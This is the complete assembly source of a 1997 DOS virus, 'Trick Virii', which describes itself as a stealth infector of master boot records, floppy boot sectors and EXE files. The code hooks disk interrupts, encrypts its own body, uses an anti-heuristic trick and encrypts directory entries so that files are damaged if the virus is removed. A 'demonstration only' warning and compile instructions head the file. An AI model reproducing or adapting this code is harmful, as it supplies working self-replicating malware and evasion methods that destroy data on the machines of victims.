;    Trick Virii (446 bytes length!)
; (l) 1997 copyleft by Psychomancer // SPS.
;          2:454/7.64@FidoNet

; MBR/BOOT/EXE stealth hard-removable infector.
;  Thanx 2 Nutcracker 4 "cryp_sec" algorithm.

; WARNING! 4 compile tasm /m option needed!
;    DON'T RUN IT! ONLY 4 DEMONSTRATION!

model tiny
.code

begin:		mov	cx,decryp_len
		call	$+3
		xor	ah,ah
		int	15h			; antiheuristic trick (must b CF=1 on return)
		pop	si
		sbb	al,al			; <- set AL in zero manual on 1st execute!
						;    (in DEBUG)
		lea	di,[si+decryp_begin-6]
xor_decryp:	sub	al,0
xor_mask	equ	$-begin-1
		xor	cs:[di],al		; decrypt selfbody
		inc	di
		loop	xor_decryp
decryp_begin	equ	$-begin
decryp_code:	sub	si,6
		jz	file_start		; goto if run from file
		mov	bx,7c00h
		xor	di,di
		mov	ds,di
		mov	ss,di
		mov	sp,bx
		dec	word ptr ds:[413h]	; decrease TOM
		mov	ax,[di+3*4]
		mov	[si+rom_mask],ax	; store crypt mask
		int	12h
		mov	cx,206h
		mov	[si+offrand],ch		; set in 2
		shl	ax,cl
		mov	es,ax
		push	ss bx
		rep	movsb			; move selfbody 2 new segm
		push	es
		mov	es,cx
		mov	cl,go_after_move
		push	cx
		retf

;-----------------------------------------------;

file_start:	mov	ax,0deadh
		int	13h			; we present in memory?
		jnc	file_exit
		mov	ah,13h
		int	2fh
		mov	ax,259ah
		int	21h			; set int 9ah on ROM int 13h
		mov	ah,13h
		int	2fh
		push	cs
		pop	es
		mov	ax,1600h
		int	2fh
		cmp	ax,1600h		; we execute under windoze?
		mov	al,0
		org	$-1
		jnc	$			; no - will b crypt direntries
		org	$-1
		je	no_win_run
		mov	al,0
		org	$-1
		jmp	$			; yeah - no crypt direntries
		org	$-1
no_win_run:	mov	cs:cryp_switch,al	; store it
		lea	bx,buffer
		call	copy_2_mbr		; infect mbr on 1st hd
file_exit:	.exit

;-----------------------------------------------;

go_after_move	equ	$-begin
		mov	si,13h*4
		mov	di,9ah*4
		movsw				; set int 9ah on ROM int 13h
		movsw
		mov	word ptr [si-4],offset int_13h_entry ; hook int 13h
		mov	[si-2],ax
		cmp	byte ptr [bx],0ebh	; we loading from floppy boot?
		jne	load_from_mbr
		call	copy_2_mbr		; yeah - infect mbr on 1st hd
load_from_mbr:	mov	cl,11h			; read original mbr code
read_sec:	mov	dx,80h
		mov	ax,201h
		int	9ah
		retf				; exit

;-----------------------------------------------;

int_13h_entry:	mov	cs:store_fn,ah
		mov	cs:store_sc,al
		cmp	ax,0deadh		; our function?
		je	exit_13h_retf
		int	9ah			; call old int 13h
		pushf
		push	ax si di ds dx cx es
		pop	ds
		jc	exit_13h		; exit if error
		mov	ax,0
store_fn	=	byte ptr $-2
		cmp	dl,80h			; non-1st hd?
		je	hd_access
		cmp	al,3			; write?
		jne	exit_13h
		cmp	dx,cx			; floppy?
		ja	no_boot_write
		dec	cx			; boot?
		jnz	no_boot_write
		mov	word ptr [bx],3eebh	; yeah - infect floppy boot
		jmp	copy_2_boot
no_boot_write:	mov	ax,[bx]
		not	ax
		mul	ah
		sub	ax,72bah		; 'MZ' or 'ZM' in buffer?
		jnz	exit_13h
		int	1ah			; get timer tick
		mov	cl,0			; randomize
offrand		equ	$-begin-1
		xchg	dx,ax
		cwd
		idiv	cx			; get random
		and	dx,dx
		jnz	exit_13h
		mov	[bx+6],dx		; set number of relocation on zero
		mov	word ptr [bx+8],4	; length of header
		mov	[bx+14h],dx		; set cs:ip on zero (i.e. on trick ;)
		mov	[bx+16h],dx
		rol	byte ptr cs:offrand,1	; change randomize
copy_2_boot:	lea	di,[bx+40h]
		call	crypt_self		; self encrypt and move 2 buffer
		pop	cx dx
		call	write_sec		; write sector on disk
		jmp	exit_13h_pop
hd_access:	cmp	al,2			; read?
		jne	no_stealth
		and	dh,dh			; head is zero?
		jnz	hd_read
		dec	cx			; cyl/sec is 0/1?
		jnz	hd_read
		mov	cl,11h
		push	cs
		call	read_sec		; read original mbr
exit_13h:	pop	cx dx 
exit_13h_pop:	pop	ds di si ax
		popf
exit_13h_retf:	retf	2			; exit from int 13h
no_stealth:	cmp	al,3			; write?
		jne	exit_13h
hd_read:	mov	cs:cryp_or_decryp,0	; set "js"
		org	$-1
		js	$
		org	$-1
		call	crypt_sec		; encrypt direntries in buffer
cryp_switch	label	byte
		jnc	decrypt_sec		; goto if direntries is not found
		pop	cx			; restore cyl/sec
		push	cx
		mov	ah,3
		int	9ah			; re-write crypted direntries
decrypt_sec:	lea	ax,exit_13h		; decrypt direntries in buffer
		push	ax

;-----------------------------------------------;

crypt_sec:	mov	cx,0			; number of sector
store_sc	=	byte ptr $-2
		push	cx
		mov	si,bx
scan_next_sec:	push	cx
		mov	cl,10h			; number of direntries on one sector
scan_next_elem:	push	cx si
		mov	cl,0bh
next_char_name:	lodsb
		cmp	al,' '			; check if filename
		jb	get_next_elem
		loop	next_char_name
		lodsb
		test	al,11001000b		; check if attribute
		jnz	get_next_elem
		mov	cl,9
next_char_res:	lodsb
		and	al,al			; check if normal (not long!) filename
		jnz	get_next_elem
		loop	next_char_res
		test	[si],dl			; already en/decrypted?
cryp_or_decryp	label	byte
		js	get_next_elem
		xor	[si],dl			; en/decrypt direntry
		mov	ax,0			; mask of crypt
rom_mask	equ	$-begin-2
		sub	ax,[si+1]
		xor	[si+5],ax
		mov	ah,1			; set bit
get_next_elem:	pop	si cx
		add	si,20h			; get next direntry
		loop	scan_next_elem
		pop	cx			; get next sector
		loop	scan_next_sec
		inc	cs:cryp_or_decryp	; change condition
		sahf				; store bit on cf
		pop	ax
		retn

;-----------------------------------------------;

crypt_self:	push	cs
		pop	ds
		xor	si,si
		in	al,40h			; get random mask
		mov	[si+xor_mask],al
		mov	cl,decryp_begin
		rep	movsb			; move unencrypted part
		mov	ah,-1
		mov	cx,decryp_len
xor_encryp:	sub	ah,al
		movsb
		xor	es:[di-1],ah
		loop	xor_encryp		; move and encrypt selfbody
		retn

;-----------------------------------------------;

copy_2_mbr:	mov	cx,1
		push	cs
		call	read_sec		; read mbr on 1st hd
		cmp	byte ptr es:[bx],0	; already infected?
		org	$-1
		mov	cx,0
		org	$-2
		je	already_prs
		mov	cl,11h
		call	write_sec		; store original mbr in 0/0/17
		mov	di,bx
		call	crypt_self		; move and encrypt selfbody
		inc	cx			; cx=1
write_sec:	mov	ax,301h
		int	9ah			; infect mbr
already_prs:	retn

decryp_len	equ	$-decryp_code
len_body	equ	$-begin
buffer		label	byte

		end	begin
